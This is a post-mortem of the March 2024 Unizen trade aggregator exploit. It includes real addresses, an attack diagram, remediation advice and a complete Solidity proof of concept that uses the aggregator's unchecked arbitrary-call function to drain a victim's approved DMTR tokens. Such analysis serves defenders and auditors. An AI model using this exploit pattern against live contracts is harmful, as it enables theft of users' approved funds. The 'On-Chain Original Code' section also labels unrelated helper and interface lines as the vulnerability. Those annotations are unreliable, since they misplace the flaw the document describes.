# UnizenIO — Trade Aggregator Arbitrary Calldata Execution Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | Unizen Trade Aggregator |
| **Chain** | Ethereum |
| **Loss** | ~$2,000,000 |
| **Attacker** | [0x2aD8aed8](https://etherscan.io/address/0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df) |
| **Victim** | [0x7feAeE60](https://etherscan.io/address/0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a) |
| **Vulnerable Contract** | [TradeAggregator 0xd3f64BAa](https://etherscan.io/address/0xd3f64BAa732061F8B3626ee44bab354f854877AC) |
| **DMTR Token** | [0x51cB2537](https://etherscan.io/address/0x51cB253744189f11241becb29BeDd3F1b5384fdB) |
| **Root Cause** | The selector `0x1ef29a02` function in the trade aggregator proxy executes arbitrary target + calldata within a Call struct, exploiting victim's DMTR token approval to execute `transferFrom` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/UnizenIO_exp.sol) |

---

## 1. Vulnerability Overview

The `0x1ef29a02` selector function of the Unizen trade aggregator can execute arbitrary target addresses and calldata within a `Call` struct. By leveraging the DMTR token approval that victims had granted to the aggregator, the attacker encoded `transferFrom(victim, aggregator, balance)` calldata and called the function, draining ~2.5 trillion DMTR tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: executes arbitrary target + calldata from Call struct
struct Info {
    address recipient;
    address token;
    uint256 amount;
    bytes32 uuid;
    uint256 apiId;
    uint256 fee;
}

struct Call {
    address target;   // ← arbitrary address
    uint256 value;
    bytes callData;   // ← arbitrary calldata (including transferFrom)
}

// Selector 0x1ef29a02
function trade(Info memory info, Call[] memory calls) external payable {
    for (uint i = 0; i < calls.length; i++) {
        // No validation that target is an allowed address
        // No validation that callData is not transferFrom
        (bool success,) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
        require(success);
    }
}

// ✅ Safe code: Call target whitelist + transferFrom selector blocking
mapping(address => bool) public allowedTargets;

function trade(Info memory info, Call[] memory calls) external payable {
    for (uint i = 0; i < calls.length; i++) {
        require(allowedTargets[calls[i].target], "target not allowed");
        bytes4 selector = bytes4(calls[i].callData);
        require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
        (bool success,) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
        require(success);
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Ownable.sol
    function transferExecutorship(address newExecutor) public virtual onlyExecutor {  // ❌ Vulnerability
        _pendingExecutor = newExecutor;
        emit ExecutorshipTransferStarted(executor(), newExecutor);
    }
```

```solidity
// File: TransferHelper.sol
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));  // ❌ Vulnerability
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_TOKEN_FAILED');
    }

    function safeTransferWithoutRequire(address token, address to, uint256 value) internal returns (bool) {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        return (success && (data.length == 0 || abi.decode(data, (bool))));
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        // solium-disable-next-line
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: TRANSFER_FAILED');
    }

    function safeDeposit(address wrapped, uint value) internal {
        // bytes4(keccak256(bytes('deposit()')));
        (bool success, bytes memory data) = wrapped.call{value:value}(abi.encodeWithSelector(0xd0e30db0));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: DEPOSIT_FAILED');
    }

    function safeWithdraw(address wrapped, uint value) internal {
        // bytes4(keccak256(bytes('withdraw(uint256 wad)')));
        (bool success, bytes memory data) = wrapped.call{value:0}(abi.encodeWithSelector(0x2e1a7d4d, value));
```

```solidity
// File: IERC20.sol
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);  // ❌ Vulnerability
 
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query victim address and DMTR balance
  │         └─ victim = 0x7feAeE60..., balance = ~2.5T DMTR
  │
  ├─→ [2] Encode transferFrom calldata
  │         └─ 0x23b872dd(victim, aggregator, balance)
  │
  ├─→ [3] Construct Call struct
  │         └─ target = DMTR, callData = transferFrom(...)
  │
  ├─→ [4] Call trade(info, [call]) (selector 0x1ef29a02)
  │         └─ Executes DMTR.transferFrom without validation
  │
  ├─→ [5] Victim's DMTR transferred → to aggregator
  │
  └─→ [6] ~$2M worth of DMTR drained
```

## 4. PoC Code (Core Logic + English Comments)

```solidity
interface ITradeAggregator {
    struct Info {
        address recipient;
        address token;
        uint256 amount;
        bytes32 uuid;
        uint256 apiId;
        uint256 fee;
    }

    struct Call {
        address target;
        uint256 value;
        bytes callData;
    }

    // Selector 0x1ef29a02
    function trade(Info memory info, Call[] memory calls) external payable;
}

contract AttackContract {
    ITradeAggregator constant aggregator = ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20           constant DMTR       = IERC20(0x51cB253744189f11241becb29BeDd3F1b5384fdB);
    address          constant victim     = 0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a;

    function testExploit() external {
        uint256 victimBalance = DMTR.balanceOf(victim);

        // [1] Encode transferFrom calldata
        bytes memory transferCalldata = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            victim,
            address(aggregator),
            victimBalance
        );

        // [2] Construct Call struct
        ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
        calls[0] = ITradeAggregator.Call({
            target: address(DMTR),
            value: 0,
            callData: transferCalldata
        });

        // [3] Call trade() — executes arbitrary calldata
        ITradeAggregator.Info memory info = ITradeAggregator.Info({
            recipient: address(this),
            token: address(DMTR),
            amount: victimBalance,
            uuid: bytes32(0),
            apiId: 0,
            fee: 0
        });
        aggregator.trade(info, calls);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (passing malicious Call struct to trade function) |
| **DApp Category** | DEX Trade Aggregator |
| **Impact** | Unauthorized drain of victim's approved tokens (~$2M) |

## 6. Remediation Recommendations

1. **Call target whitelist**: Only allow execution of approved DEX/protocol addresses
2. **Dangerous selector blocking**: Reject calldata containing token transfer functions such as `transferFrom` and `transfer`
3. **User token isolation**: Use a separate escrow contract rather than having the aggregator receive approvals directly
4. **Approval minimization guidance**: Improve UX to guide users to approve only the exact trade amount

## 7. Lessons Learned

- Arbitrary call execution capabilities in DEX aggregators expose the entirety of a user's token approvals to risk.
- Filtering calldata that contains the `transferFrom` selector alone would have been sufficient to prevent this class of attack.
- Given that the same vulnerability was exploited in both the UnizenIO and UnizenIO2 attacks, calldata validation is an essential security requirement in aggregator design.